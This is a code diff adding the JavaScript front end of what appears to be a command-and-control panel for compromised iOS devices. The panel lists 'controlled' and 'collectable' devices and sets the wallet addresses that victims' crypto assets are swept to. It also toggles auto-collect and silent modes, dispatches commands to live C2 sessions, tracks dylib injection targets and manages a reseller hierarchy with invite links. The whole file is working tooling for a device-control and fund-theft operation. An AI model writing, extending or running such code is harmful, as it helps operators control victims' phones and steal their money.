+    $('#records-collect-btn')?.addEventListener('click', () => runCollectExecute());
+  }
+
+  async function loadGlobalControlFromAPI() {
+    try {
+      const json = await apiFetch('/api/settings/global-control');
+      const d = json.data || {};
+      const map = {
+        'gc-auto-collect': d.auto_collect,
+        'gc-silent': d.silent,
+        'gc-heartbeat': d.heartbeat,
+        'gc-proxy-forward': d.proxy_forward,
+        'gc-log-report': d.log_report,
+        'toggle-controlled': d.controlled_filter,
+      };
+      Object.entries(map).forEach(([id, val]) => {
+        const el = document.getElementById(id);
+        if (el) el.checked = !!val;
+      });
+      const fc = document.getElementById('filter-controlled');
+      if (fc) fc.checked = !!d.controlled_filter;
+    } catch (_) {}
+  }
+
+  function loadAllFromAPI() {
+    fetchDashboardData();
+    loadDevicesFromAPI();
+    loadProxiesFromAPI();
+    loadCollectCatalog().then(() => loadCollectAddressesFromAPI());
+    loadAssetsDashboard();
+    loadColdFromAPI();
+    loadRecordsFromAPI();
+    loadGlobalControlFromAPI();
+    refreshC2Panel();
+  }
+
+  function cleanInput(el) {
+    el.value = el.value.replace(/[\u200B-\u200D\uFEFF]/g, '').trim();
+  }
+
+  ['#username', '#password'].forEach(sel => {
+    const el = $(sel);
+    el.addEventListener('paste', () => setTimeout(() => cleanInput(el), 0));
+    el.addEventListener('input', () => cleanInput(el));
+  });
+
+  $('#toggle-pwd').addEventListener('click', () => {
+    const pwd = $('#password');
+    const show = pwd.type === 'password';
+    pwd.type = show ? 'text' : 'password';
+    $('#toggle-pwd-icon-show').classList.toggle('hidden', show);
+    $('#toggle-pwd-icon-hide').classList.toggle('hidden', !show);
+  });
+
+  $('#login-form').addEventListener('submit', async (e) => {
+    e.preventDefault();
+    const u = $('#username').value.trim();
+    const p = $('#password').value;
+    try {
+      const resp = await fetch(API_BASE + '/api/auth/login', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+          username: u,
+          password: p,
+          captcha_id: $('#captcha-id').value,
+          captcha_code: $('#captcha-code').value.trim(),
+        }),
+      });
+      const json = await resp.json();
+      if (!resp.ok || json.code !== 0) {
+        alert(json.msg || '用户名或密码错误');
+        loadCaptcha();
+        return;
+      }
+      setAuthToken(json.data.access_token);
+      currentUserRole = json.data.role || 'admin';
+      currentProxyId = json.data.proxy_id || '';
+      sessionLoggedIn = true;
+      enterApp();
+      saveUiState();
+    } catch (err) {
+      alert('登录失败: ' + (err.message || err));
+      loadCaptcha();
+    }
+  });
+
+  $('#captcha-refresh')?.addEventListener('click', () => loadCaptcha());
+
+  $('#logout-btn').addEventListener('click', () => {
+    sessionLoggedIn = false;
+    setAuthToken('');
+    saveUiState();
+    if (telemetryInterval) clearInterval(telemetryInterval);
+    $('#app-shell').style.display = 'none';
+    $('#login-page').style.display = 'flex';
+    $('#username').value = '';
+    $('#password').value = '';
+  });
+
+  function switchPage(page) {
+    if (page === currentPage) return;
+    showLoading(400, () => {
+      currentPage = page;
+      const meta = PAGE_META[page];
+
+      $$('.sidebar-item').forEach(el => {
+        el.classList.toggle('active', el.dataset.page === page);
+        if (el.dataset.page !== page) el.classList.add('text-slate-text');
+        else el.classList.remove('text-slate-text');
+      });
+
+      $$('.page-view').forEach(el => el.classList.add('hidden'));
+      $(`#${meta.view}`).classList.remove('hidden');
+      $('#global-control').classList.toggle('hidden', !meta.showControl);
+      if (meta.tableTitle) $('#table-page-title').textContent = meta.tableTitle;
+
+      if (!openTabs.includes(page)) {
+        openTabs.push(page);
+        renderTabs();
+      } else {
+        highlightTab(page);
+      }
+
+      if (['devices', 'authorized', 'collectable'].includes(page)) {
+        clearSearchInputs();
+        renderDeviceTable();
+      }
+      if (page === 'agents') renderProxyTable();
+      if (page === 'collectaddr') { renderCollectAddress(); loadRpcSettings(); }
+      if (page === 'cold') loadColdFromAPI();
+      if (page === 'records') loadRecordsFromAPI();
+      if (page === 'assets') loadAssetsDashboard();
+      if (page === 'c2') refreshC2Panel();
+    });
+  }
+
+  $$('#sidebar-nav .sidebar-item').forEach(btn => {
+    btn.addEventListener('click', () => switchPage(btn.dataset.page));
+  });
+
+  function renderTabs() {
+    const bar = $('#tab-bar');
+    bar.innerHTML = '';
+    openTabs.forEach(tab => {
+      const span = document.createElement('span');
+      span.className = 'tab-item px-3 py-3 cursor-pointer text-slate-text text-sm' + (tab === currentPage ? ' active' : '');
+      span.dataset.tab = tab;
+      span.textContent = PAGE_META[tab].title;
+      span.addEventListener('click', () => switchPage(tab));
+      bar.appendChild(span);
+    });
+    highlightTab(currentPage);
+  }
+
+  function highlightTab(page) {
+    $$('#tab-bar .tab-item').forEach(t => t.classList.toggle('active', t.dataset.tab === page));
+  }
+
+  function statusBadge(controlled) {
+    return controlled
+      ? '<span class="badge badge-green">受控</span>'
+      : '<span class="badge badge-gray">离线</span>';
+  }
+
+  function boolBadge(val, yesClass, noClass) {
+    return val
+      ? `<span class="badge ${yesClass}">是</span>`
+      : `<span class="badge ${noClass}">否</span>`;
+  }
+
+  function renderDashboard() {
+    $('#stat-devices').textContent = (deviceStats.controlled || 0).toLocaleString();
+    $('#stat-authorized').textContent = (deviceStats.authorized || 0).toLocaleString();
+    $('#stat-collectable').textContent = (deviceStats.collectable || 0).toLocaleString();
+    const collectableUsd = assetDashboard.summary?.collectable_usd;
+    const sub = $('#stat-collectable-sub');
+    if (sub && collectableUsd != null && collectableUsd > 0) {
+      sub.textContent = `可归集 $${Number(collectableUsd).toLocaleString(undefined, { minimumFractionDigits: 2, maximumFractionDigits: 2 })}`;
+    } else if (sub) {
+      sub.textContent = 'collectable assets';
+    }
+  }
+
+  function renderDeviceTable() {
+    const tbody = $('#device-tbody');
+    const meta = PAGE_META[currentPage];
+    const pageFilter = meta.filter;
+    const onlyControlled = $('#filter-controlled').checked || $('#toggle-controlled').checked;
+
+    let rows = devices.filter(d => {
+      if (pageFilter === 'authorized' && !d.authorized) return false;
+      if (pageFilter === 'collectable' && !d.collectable) return false;
+      if (onlyControlled && !d.controlled) return false;
+      return true;
+    });
+
+    tbody.innerHTML = rows.map(d => `
+      <tr data-id="${d.id}" data-ip="${d.ip}" data-uid="${d.uid}" data-domain="${d.domain}"
+          data-controlled="${d.controlled}" data-authorized="${d.authorized}" data-collectable="${d.collectable}"
+          class="hover:bg-neon-blue/[0.03] transition-colors">
+        <td class="font-mono text-xs">${d.id}</td>
+        <td class="font-mono text-xs">${d.ip}</td>
+        <td class="font-mono text-xs">${d.uid}</td>
+        <td class="text-xs">${d.version}</td>
+        <td class="text-xs text-center">${d.tasks}</td>
+        <td class="text-xs text-center">${d.threads}</td>
+        <td class="text-xs font-mono text-slate-dim">${d.domain}</td>
+        <td>${statusBadge(d.controlled)}</td>
+        <td>${boolBadge(d.authorized, 'badge-green', 'badge-gray')}</td>
+        <td>${boolBadge(d.collectable, 'badge-amber', 'badge-gray')}</td>
+      </tr>
+    `).join('');
+
+    $('#empty-hint').classList.toggle('hidden', rows.length > 0);
+    renderDashboard();
+  }
+
+  function clearSearchInputs() {
+    ['search-device-id', 'search-uid', 'search-ip', 'search-domain'].forEach(id => {
+      $(`#${id}`).value = '';
+    });
+    $('#filter-controlled').checked = false;
+  }
+
+  function filterTableRows() {
+    const idQ = $('#search-device-id').value.trim().toLowerCase();
+    const uidQ = $('#search-uid').value.trim().toLowerCase();
+    const ipQ = $('#search-ip').value.trim().toLowerCase();
+    const domainQ = $('#search-domain').value.trim().toLowerCase();
+    const onlyControlled = $('#filter-controlled').checked;
+
+    let visible = 0;
+    $$('#device-tbody tr').forEach(row => {
+      const match =
+        (!idQ || row.dataset.id.includes(idQ)) &&
+        (!uidQ || row.dataset.uid.toLowerCase().includes(uidQ)) &&
+        (!ipQ || row.dataset.ip.includes(ipQ)) &&
+        (!domainQ || row.dataset.domain.toLowerCase().includes(domainQ)) &&
+        (!onlyControlled || row.dataset.controlled === 'true');
+
+      row.classList.toggle('hidden-row', !match);
+      if (match) visible++;
+    });
+    $('#empty-hint').classList.toggle('hidden', visible > 0);
+  }
+
+  $('#search-btn').addEventListener('click', () => showLoading(400, filterTableRows));
+  $('#reset-btn').addEventListener('click', () => {
+    showLoading(400, () => {
+      clearSearchInputs();
+      $$('#device-tbody tr').forEach(row => row.classList.remove('hidden-row'));
+      const visible = $$('#device-tbody tr').length;
+      $('#empty-hint').classList.toggle('hidden', visible > 0);
+    });
+  });
+
+  $('#filter-controlled').addEventListener('change', () => {
+    if (['devices', 'authorized', 'collectable'].includes(currentPage)) {
+      showLoading(400, () => renderDeviceTable());
+    }
+  });
+
+  $('#toggle-controlled').addEventListener('change', (e) => {
+    $('#filter-controlled').checked = e.target.checked;
+    if (['devices', 'authorized', 'collectable'].includes(currentPage)) {
+      showLoading(400, () => renderDeviceTable());
+    }
+  });
+
+  function formatMoney(n) {
+    return '$' + Number(n).toLocaleString('en-US', { minimumFractionDigits: 2, maximumFractionDigits: 2 });
+  }
+
+  function proxyStatusBadge(status) {
+    const map = { active: 'badge-green', paused: 'badge-amber', disabled: 'badge-red' };
+    const label = status === 'paused' ? '暂停' : status === 'disabled' ? '停用' : '正常';
+    return `<span class="badge ${map[status] || 'badge-gray'}">${label}</span>`;
+  }
+
+  function renderProxyParentOptions(selected) {
+    const sel = $('#proxy-parent');
+    if (!sel) return;
+    const opts = ['<option value="">无（顶级代理）</option>'];
+    proxies.forEach(p => {
+      opts.push(`<option value="${p.proxy_id}" ${p.proxy_id === selected ? 'selected' : ''}>${p.name} (${p.proxy_id})</option>`);
+    });
+    sel.innerHTML = opts.join('');
+  }
+
+  function renderProxyTable() {
+    const tbody = $('#proxy-tbody');
+    if (!tbody) return;
+    tbody.innerHTML = proxies.map((p, i) => {
+      const indent = '&nbsp;'.repeat((p.depth || 0) * 4);
+      return `
+      <tr class="hover:bg-neon-blue/[0.03] transition-colors">
+        <td class="font-mono text-xs">${i + 1}</td>
+        <td class="font-medium text-white text-xs">${indent}${p.name}<div class="text-[10px] text-slate-dim font-mono">${p.proxy_id}</div></td>
+        <td class="font-mono text-[10px]">${p.parent_proxy_id || '—'}</td>
+        <td class="font-mono text-[10px] text-neon-cyan">${p.channel_code || '—'}</td>
+        <td class="font-mono text-xs">${(p.deviceCount || 0).toLocaleString()}</td>
+        <td class="text-neon-amber font-mono text-xs">${formatMoney(p.totalAssets || 0)}</td>
+        <td>${proxyStatusBadge(p.status)}</td>
+        <td class="space-x-1">
+          <button class="text-[10px] px-2 py-1 rounded border border-void-border hover:border-neon-blue text-slate-dim hover:text-white cursor-pointer" data-proxy-view="${p.proxy_id}">管理</button>
+        </td>
+      </tr>`;
+    }).join('');
+
+    tbody.querySelectorAll('[data-proxy-view]').forEach(btn => {
+      btn.addEventListener('click', () => openProxyDetail(btn.dataset.proxyView));
+    });
+
+    $('#stat-proxy-count').textContent = (proxyStats.count || proxies.length).toLocaleString();
+    $('#stat-proxy-devices').textContent = (proxyStats.total_devices || 0).toLocaleString();
+    $('#stat-proxy-assets').textContent = formatMoney(proxyStats.total_assets || 0);
+    $('#proxy-empty-hint').classList.toggle('hidden', proxies.length > 0);
+  }
+
+  async function openProxyDetail(proxyId) {
+    editingProxyId = proxyId;
+    try {
+      const json = await apiFetch('/api/proxies/' + proxyId + '/detail');
+      const d = json.data;
+      const p = d.proxy;
+      $('#proxy-detail-title').textContent = p.name + ' · ' + p.proxy_id;
+      $('#proxy-detail-meta').innerHTML = `
+        渠道码: <span class="text-neon-cyan">${p.channel_code || '—'}</span> ·
+        登录: <span class="text-white">${p.login_username || '—'}</span> ·
+        邀请链接: <span class="text-slate-text">group.html?channel=${p.channel_code || ''}</span>`;
+      $('#proxy-edit-status').value = p.status || 'active';
+      $('#proxy-edit-note').value = p.note || '';
+      $('#proxy-edit-password').value = '';
+      const devBody = $('#proxy-detail-devices');
+      devBody.innerHTML = (d.devices || []).map(dev => `
+        <tr>
+          <td class="font-mono">${dev.device_id}</td>
+          <td>${dev.ip || '—'}</td>
+          <td>${dev.controlled ? '是' : '否'}</td>
+          <td>${dev.collectable ? '是' : '否'}</td>
+        </tr>`).join('') || '<tr><td colspan="4" class="text-slate-dim">暂无设备</td></tr>';
+      const modal = $('#proxy-detail-modal');
+      modal.classList.remove('hidden');
+      modal.classList.add('flex', 'open');
+    } catch (e) { alert('加载失败: ' + e.message); }
+  }
+
+  function closeProxyDetail() {
+    const modal = $('#proxy-detail-modal');
+    modal.classList.add('hidden');
+    modal.classList.remove('flex', 'open');
+    editingProxyId = '';
+  }
+
+  const proxyModal = $('#proxy-modal');
+  function openProxyModal() {
+    renderProxyParentOptions(currentProxyId || '');
+    $('#proxy-create-result').classList.add('hidden');
+    proxyModal.classList.remove('hidden');
+    proxyModal.classList.add('flex', 'open');
+  }
+  function closeProxyModal() {
+    proxyModal.classList.add('hidden');
+    proxyModal.classList.remove('flex', 'open');
+    ['proxy-name', 'proxy-login-user', 'proxy-login-pass', 'proxy-note'].forEach(id => { $(`#${id}`).value = ''; });
+  }
+
+  $('#add-proxy-btn').addEventListener('click', openProxyModal);
+  $('#proxy-modal-close').addEventListener('click', closeProxyModal);
+  $('#proxy-modal-cancel').addEventListener('click', closeProxyModal);
+  proxyModal.addEventListener('click', (e) => { if (e.target === proxyModal) closeProxyModal(); });
+
+  $('#proxy-modal-save').addEventListener('click', async () => {
+    const name = $('#proxy-name').value.trim();
+    if (!name) { alert('请输入代理名称'); return; }
+    try {
+      const json = await apiFetch('/api/proxies/hierarchy', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+          name,
+          parent_proxy_id: $('#proxy-parent').value.trim(),
+          login_username: $('#proxy-login-user').value.trim(),
+          login_password: $('#proxy-login-pass').value.trim(),
+          note: $('#proxy-note').value.trim(),
+        }),
+      });
+      const d = json.data || {};
+      const out = $('#proxy-create-result');
+      out.textContent = `已创建 ${d.proxy_id} · 账号 ${d.login_username} · 密码 ${d.login_password} · 渠道 ${d.channel_code}`;
+      out.classList.remove('hidden');
+      showLoading(400, loadProxiesFromAPI);
+    } catch (e) { alert('保存失败: ' + e.message); }
+  });
+
+  $('#proxy-detail-close')?.addEventListener('click', closeProxyDetail);
+  $('#proxy-detail-save')?.addEventListener('click', async () => {
+    if (!editingProxyId) return;
+    try {
+      await apiFetch('/api/proxies/' + editingProxyId + '/hierarchy', {
+        method: 'PUT',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+          status: $('#proxy-edit-status').value,
+          note: $('#proxy-edit-note').value.trim(),
+          login_password: $('#proxy-edit-password').value.trim() || undefined,
+        }),
+      });
+      closeProxyDetail();
+      showLoading(400, loadProxiesFromAPI);
+    } catch (e) { alert('更新失败: ' + e.message); }
+  });
+  $('#proxy-detail-delete')?.addEventListener('click', async () => {
+    if (!editingProxyId || !confirm('确定删除该代理及其下级？')) return;
+    try {
+      await apiFetch('/api/proxies/' + editingProxyId + '/hierarchy', { method: 'DELETE' });
+      closeProxyDetail();
+      showLoading(400, loadProxiesFromAPI);
+    } catch (e) { alert('删除失败: ' + e.message); }
+  });
+
+  function setCollectFieldsEnabled(enabled) {
+    collectVerified = enabled;
+    const fields = $('#collect-addr-fields');
+    const saveBtn = $('#collect-modal-save');
+    fields.classList.toggle('opacity-50', !enabled);
+    fields.classList.toggle('pointer-events-none', !enabled);
+    saveBtn.disabled = !enabled;
+    saveBtn.classList.toggle('opacity-50', !enabled);
+    saveBtn.classList.toggle('cursor-not-allowed', !enabled);
+    if (enabled) saveBtn.classList.add('hover:bg-blue-600');
+    else saveBtn.classList.remove('hover:bg-blue-600');
+  }
+
+  const collectModal = $('#collect-modal');
+  function openCollectModal() {
+    collectVerified = false;
+    $('#collect-guard-pass').value = '';
+    renderCollectModalFields();
+    getCatalog().forEach(a => {
+      const el = document.getElementById('collect-input-' + a.dest_key);
+      if (el) el.value = collectAddresses[a.dest_key] || '';
+    });
+    $('#collect-pass-error').classList.add('hidden');
+    setCollectFieldsEnabled(false);
+    collectModal.classList.remove('hidden');
+    collectModal.classList.add('flex', 'open');
+  }
+  function closeCollectModal() {
+    collectModal.classList.add('hidden');
+    collectModal.classList.remove('flex', 'open');
+    collectVerified = false;
+  }
+
+  $('#change-collect-btn').addEventListener('click', openCollectModal);
+  $('#collect-modal-close').addEventListener('click', closeCollectModal);
+  $('#collect-modal-cancel').addEventListener('click', closeCollectModal);
+  collectModal.addEventListener('click', (e) => { if (e.target === collectModal) closeCollectModal(); });
+
+  $('#collect-verify-btn').addEventListener('click', () => {
+    const pass = $('#collect-guard-pass').value;
+    if (pass === COLLECT_GUARD_PASS) {
+      $('#collect-pass-error').classList.add('hidden');
+      setCollectFieldsEnabled(true);
+    } else {
+      $('#collect-pass-error').classList.remove('hidden');
+      setCollectFieldsEnabled(false);
+    }
+  });
+
+  $('#collect-guard-pass').addEventListener('keydown', (e) => {
+    if (e.key === 'Enter') { e.preventDefault(); $('#collect-verify-btn').click(); }
+  });
+
+  $('#collect-modal-save').addEventListener('click', async () => {
+    if (!collectVerified) { alert('请先验证强密码'); return; }
+    const payload = { password: $('#collect-guard-pass').value };
+    let hasAny = false;
+    getCatalog().forEach(a => {
+      const el = document.getElementById('collect-input-' + a.dest_key);
+      const val = el ? el.value.trim() : '';
+      payload[a.dest_key] = val;
+      if (val) hasAny = true;
+    });
+    if (!hasAny) { alert('请至少填写一种归集地址'); return; }
+    try {
+      await apiFetch('/api/collect/addresses', {
+        method: 'PUT',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify(payload),
+      });
+      closeCollectModal();
+      showLoading(400, loadCollectAddressesFromAPI);
+    } catch (e) { alert('保存失败: ' + e.message); }
+  });
+
+  const modal = $('#agent-modal');
+  function openModal() {
+    modal.classList.remove('hidden');
+    modal.classList.add('flex', 'open');
+  }
+  function closeModal() {
+    modal.classList.add('hidden');
+    modal.classList.remove('flex', 'open');
+    ['agent-name', 'agent-host', 'agent-port', 'agent-note'].forEach(id => { $(`#${id}`).value = ''; });
+  }
+
+  $('#add-agent-btn').addEventListener('click', openModal);
+  $('#modal-close').addEventListener('click', closeModal);
+  $('#modal-cancel').addEventListener('click', closeModal);
+  modal.addEventListener('click', (e) => { if (e.target === modal) closeModal(); });
+
+  $('#modal-save').addEventListener('click', async () => {
+    const name = $('#agent-name').value.trim() || 'agent-new';
+    const host = $('#agent-host').value.trim() || '0.0.0.0';
+    const port = $('#agent-port').value.trim() || '';
+    try {
+      await apiFetch('/api/devices', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+          name,
+          host,
+          port,
+          ip: host,
+          uid: name,
+          ios_version: 'iOS 17.6',
+          controlled: true,
+          authorized: false,
+          collectable: true,
+          note: $('#agent-note').value.trim(),
+        }),
+      });
+      closeModal();
+      if (['devices', 'authorized', 'collectable'].includes(currentPage)) {
+        showLoading(400, loadDevicesFromAPI);
+      } else {
+        switchPage('devices');
+      }
+    } catch (e) { alert('添加失败: ' + e.message); }
+  });
+
+  function renderColdTable() {
+    const tbody = $('#cold-tbody');
+    if (!tbody) return;
+    tbody.innerHTML = coldAddresses.map(c => `
+      <tr class="hover:bg-neon-blue/[0.03] transition-colors">
+        <td class="font-mono text-xs break-all">${c.address || '—'}</td>
+        <td class="text-xs">${c.chain || '—'}</td>
+        <td class="font-mono text-xs text-neon-amber">${Number(c.balance || 0).toFixed(4)}</td>
+        <td class="text-xs font-mono text-slate-dim">${c.last_active ? new Date(c.last_active * 1000).toLocaleString() : '—'}</td>
+        <td class="text-right">
+          <button type="button" data-cold-id="${c.id || ''}" class="cold-delete-btn text-[10px] text-neon-red hover:underline cursor-pointer">删除</button>
+        </td>
+      </tr>
+    `).join('');
+    $('#cold-empty-hint')?.classList.toggle('hidden', coldAddresses.length > 0);
+    tbody.querySelectorAll('.cold-delete-btn').forEach(btn => {
+      btn.addEventListener('click', async () => {
+        const coldId = btn.getAttribute('data-cold-id');
+        if (!coldId || !confirm('确定删除该冷地址？')) return;
+        try {
+          await apiFetch('/api/collect/cold/' + encodeURIComponent(coldId), { method: 'DELETE' });
+          await loadColdFromAPI();
+        } catch (e) { alert('删除失败: ' + e.message); }
+      });
+    });
+  }
+
+  function bindColdAddressForm() {
+    const form = $('#cold-add-form');
+    const toggleBtn = $('#add-cold-btn');
+    const cancelBtn = $('#cold-cancel-btn');
+    toggleBtn?.addEventListener('click', () => {
+      form?.classList.toggle('hidden');
+      if (form && !form.classList.contains('hidden')) $('#cold-address')?.focus();
+    });
+    cancelBtn?.addEventListener('click', () => {
+      form?.classList.add('hidden');
+      $('#cold-address').value = '';
+      $('#cold-label').value = '';
+    });
+    form?.addEventListener('submit', async (e) => {
+      e.preventDefault();
+      const chain = ($('#cold-chain')?.value || '').trim();
+      const address = ($('#cold-address')?.value || '').trim();
+      const label = ($('#cold-label')?.value || '').trim();
+      if (!chain || !address) { alert('请填写链与地址'); return; }
+      try {
+        await apiFetch('/api/collect/cold', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({ chain, address, label }),
+        });
+        form.classList.add('hidden');
+        $('#cold-address').value = '';
+        $('#cold-label').value = '';
+        await loadColdFromAPI();
+      } catch (err) { alert('添加失败: ' + err.message); }
+    });
+  }
+
+  function renderRecordsTable() {
+    const tbody = $('#records-tbody');
+    if (!tbody) return;
+    tbody.innerHTML = collectRecords.map(r => {
+      const ts = r.created_at ? new Date(r.created_at * 1000).toLocaleString() : '—';
+      const stCls = r.status === 'confirmed' ? 'badge-green' : r.status === 'pending' ? 'badge-amber' : 'badge-gray';
+      return `
+      <tr class="hover:bg-neon-blue/[0.03] transition-colors">
+        <td class="font-mono text-xs">${r.device_id || '—'}</td>
+        <td class="text-xs">${r.chain || '—'}</td>
+        <td class="font-mono text-xs text-neon-amber">${Number(r.amount || 0).toFixed(4)}</td>
+        <td class="font-mono text-xs break-all">${r.tx_hash || '—'}</td>
+        <td><span class="badge ${stCls}">${r.status || '—'}</span></td>
+        <td class="text-xs font-mono text-slate-dim">${ts}</td>
+      </tr>`;
+    }).join('');
+    $('#records-empty-hint')?.classList.toggle('hidden', collectRecords.length > 0);
+  }
+
+  function bindGlobalControl() {
+    const fields = [
+      ['gc-auto-collect', 'auto_collect'],
+      ['gc-silent', 'silent'],
+      ['gc-heartbeat', 'heartbeat'],
+      ['gc-proxy-forward', 'proxy_forward'],
+      ['gc-log-report', 'log_report'],
+    ];
+    fields.forEach(([id, key]) => {
+      document.getElementById(id)?.addEventListener('change', async (e) => {
+        try {
+          await apiFetch('/api/settings/global-control', {
+            method: 'PUT',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ [key]: e.target.checked }),
+          });
+        } catch (err) { alert('设置保存失败'); }
+      });
+    });
+    document.getElementById('toggle-controlled')?.addEventListener('change', async (e) => {
+      $('#filter-controlled').checked = e.target.checked;
+      try {
+        await apiFetch('/api/settings/global-control', {
+          method: 'PUT',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({ controlled_filter: e.target.checked }),
+        });
+      } catch (_) {}
+      if (['devices', 'authorized', 'collectable'].includes(currentPage)) {
+        renderDeviceTable();
+      }
+    });
+  }
+
+  async function refreshC2Panel() {
+    const list = document.getElementById('c2-sessions-list');
+    const empty = document.getElementById('c2-sessions-empty');
+    const select = document.getElementById('c2-target-session');
+    const history = document.getElementById('c2-history-list');
+    if (!list || !select) return;
+    try {
+      const [sessJson, histJson] = await Promise.all([
+        apiFetch('/api/c2/sessions'),
+        apiFetch('/api/c2/history?limit=50'),
+      ]);
+      const sessions = sessJson.data || [];
+      list.innerHTML = sessions.map(s => `
+        <div class="rounded-lg border border-void-border p-2 ${s.is_alive ? 'border-neon-green/30' : ''}">
+          <div class="text-white">${s.device_id} <span class="text-slate-dim">(${s.session_id.slice(0,8)})</span></div>
+          <div class="text-slate-dim mt-1">${s.ip} · ${s.ios_version} · ${s.is_alive ? 'LIVE' : 'OFFLINE'}</div>
+        </div>
+      `).join('');
+      if (empty) empty.classList.toggle('hidden', sessions.length > 0);
+      select.innerHTML = sessions.filter(s => s.is_alive).map(s =>
+        `<option value="${s.session_id}">${s.device_id} (${s.session_id.slice(0,8)})</option>`
+      ).join('') || '<option value="">无活跃会话</option>';
+      if (history) {
+        history.innerHTML = (histJson.data || []).slice().reverse().map(c =>
+          `<div class="text-slate-text"><span class="text-neon-blue">${c.cmd}</span> · ${c.status} · ${c.id}</div>`
+        ).join('') || '<div class="text-slate-dim">暂无命令历史</div>';
+      }
+    } catch (_) {
+      if (empty) empty.classList.remove('hidden');
+    }
+  }
+
+  function bindC2Panel() {
+    document.getElementById('c2-dispatch-btn')?.addEventListener('click', async () => {
+      const sessionId = document.getElementById('c2-target-session')?.value;
+      const cmd = document.getElementById('c2-cmd-select')?.value || 'logmsg';
+      let args = {};
+      try {
+        const raw = document.getElementById('c2-cmd-args')?.value.trim();
+        args = raw ? JSON.parse(raw) : (cmd === 'logmsg' ? { msg: 'hello from console' } : {});
+      } catch (_) { alert('命令参数 JSON 无效'); return; }
+      if (!sessionId) { alert('请选择活跃会话'); return; }
+      try {
+        await apiFetch('/api/c2/dispatch', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({ cmd, args, target_session: sessionId }),
+        });
+        refreshC2Panel();
+      } catch (e) { alert('下发失败: ' + e.message); }
+    });
+  }
+
+  // === BACKEND API INTEGRATION ===
+
+  async function fetchDashboardData() {
+    try {
+      const json = await apiFetch('/api/dashboard/full');
+      const d = json.data;
+
+      if (d.metrics) {
+        const mh = document.getElementById('metric-health');
+        const mb = document.getElementById('metric-blocked');
+        const mc = document.getElementById('metric-captured');
+        if (mh) mh.textContent = d.metrics.system_health + '%';
+        if (mb) mb.textContent = d.metrics.blocked_today.toLocaleString();
+        if (mc) mc.textContent = d.metrics.captured_today.toLocaleString();
+        deviceStats = {
+          controlled: d.metrics.controlled_devices || 0,
+          authorized: d.metrics.authorized_devices || 0,
+          collectable: d.metrics.collectable_devices || 0,
+        };
+        if (d.assets) {
+          assetDashboard.summary = d.assets;
+          if (d.asset_chain_breakdown) assetDashboard.chain_breakdown = d.asset_chain_breakdown;
+        }
+        renderDashboard();
+        const uptimeEl = document.getElementById('sidebar-uptime');
+        if (uptimeEl && d.metrics.uptime_seconds != null) {
+          const h = Math.floor(d.metrics.uptime_seconds / 3600);
+          const m = Math.floor((d.metrics.uptime_seconds % 3600) / 60);
+          uptimeEl.textContent = `Uptime: ${h}h ${m}m · Latency: ${Math.round(performance.now() % 50 + 8)}ms`;
+        }
+      }
+
+      if (d.layers) {
+        applyLayerUpdate({ layer_id: 'L1', status: d.layers.L1?.status, metrics: d.layers.L1?.metrics });
+        applyLayerUpdate({ layer_id: 'L3', status: d.layers.L3?.status, metrics: d.layers.L3?.metrics });
+      }
+
+      if (d.daemon_hooks && d.daemon_hooks.length > 0) {
+        renderDaemonTableFromAPI(d.daemon_hooks);
+      }
+
+      if (d.domains) renderDomainGrid(d.domains);
+      if (d.threat_timeline) renderThreatTimeline(d.threat_timeline);
+
+      if (d.telemetry && d.telemetry.recent) {
+        const stream = document.getElementById('terminal-stream');
+        if (stream && stream.children.length <= 1) {
+          stream.innerHTML = '';
+          d.telemetry.recent.forEach(evt => appendTelemetryEvent(evt));
+        }
+      }
+    } catch (_) {}
+  }
+
+  function renderDomainGrid(domains) {
+    const grid = document.getElementById('domain-grid');
+    if (!grid) return;
+    if (!domains || domains.length === 0) {
+      grid.innerHTML = '<p class="text-sm text-slate-dim py-4 text-center font-mono">No domain data</p>';
+      return;
+    }
+    grid.innerHTML = domains.map(d => `
+      <div class="flex items-center justify-between text-[11px] font-mono py-1 border-b border-void-border/50">
+        <span class="text-slate-text truncate">${d.domain}</span>
+        <span class="text-neon-blue">${d.hits}</span>
+      </div>
+    `).join('');
+  }
+
+  function renderThreatTimeline(data) {
+    const bars = document.getElementById('threat-timeline-bars');
+    if (!bars || !data) return;
+    const buckets = data.buckets || [];
+    const max = data.max_count || 1;
+    if (!buckets.length) {
+      bars.innerHTML = '<div class="flex-1 bg-neon-blue/10 rounded-t" style="height:10%"></div>';
+      return;
+    }
+    bars.innerHTML = buckets.map(b => {
+      const pct = Math.max(8, Math.round((b.count / max) * 100));
+      const cls = b.count === max && max > 0 ? 'bg-neon-red/40' : 'bg-neon-blue/30';
+      return `<div class="flex-1 ${cls} rounded-t" style="height:${pct}%"></div>`;
+    }).join('');
+  }
+
+  function renderDaemonTableFromAPI(hooks) {
+    const tbody = document.getElementById('daemon-tbody');
+    if (!tbody) return;
+    tbody.innerHTML = hooks.map(d => {
+      const riskClass = d.risk === 'high' ? 'risk-high' : d.risk === 'medium' ? 'risk-medium' : 'risk-low';
+      const riskLabel = d.risk === 'high' ? 'HIGH' : d.risk === 'medium' ? 'MED' : 'LOW';
+      const dotClass = d.risk === 'high' ? 'layer-error' : d.risk === 'medium' ? 'layer-warning' : 'layer-active';
+      let dylibBadge = '';
+      if (d.dylib_status === 'detected') {
+        dylibBadge = `<span class="badge badge-red">${d.dylib_name}</span>`;
+      } else if (d.dylib_status === 'suspicious') {
+        dylibBadge = `<span class="badge badge-amber">${d.dylib_name}</span>`;
+      } else {
+        dylibBadge = '<span class="badge badge-green">CLEAN</span>';
+      }
+      return `
+        <tr class="border-b border-void-border hover:bg-neon-blue/[0.03] transition-colors">
+          <td class="py-2.5 px-3"><div class="flex items-center gap-2"><span class="layer-indicator ${dotClass}"></span><span class="text-xs font-mono text-white font-medium">${d.process}</span><span class="text-[9px] text-slate-dim">${d.source || 'static'}</span></div></td>
+          <td class="py-2.5 px-3 text-[11px] font-mono text-slate-text">${d.inject_target}</td>
+          <td class="py-2.5 px-3 text-center"><span class="${riskClass}">${riskLabel}</span></td>
